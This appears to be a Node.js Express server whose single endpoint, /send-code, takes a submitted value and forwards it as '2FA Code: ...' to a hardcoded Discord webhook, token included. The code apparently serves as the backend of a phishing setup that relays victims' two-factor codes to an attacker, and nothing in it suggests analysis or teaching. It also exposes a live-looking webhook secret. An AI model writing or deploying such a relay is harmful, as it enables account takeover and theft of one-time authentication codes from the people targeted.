const express = require('express');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON
app.use(express.json());

// Proxy endpoint
app.post('/send-code', async (req, res) => {
  const { code } = req.body;
  const discordWebhook = 'https://discord.com/api/webhooks/1370508124267479131/Xr8W5hqlBEbvEGfWE7ijqyamIqTcyjoQ5qQ7yBXmt7PpeabLqO_2HhhBDDxXgEo3kT5L';

  try {
    await fetch(discordWebhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: `2FA Code: ${code}` }),
    });
    res.status(200).send('Code sent to Discord!');
  } catch (error) {
    console.error('Error:', error);
    res.status(500).send('Failed to send code.');
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
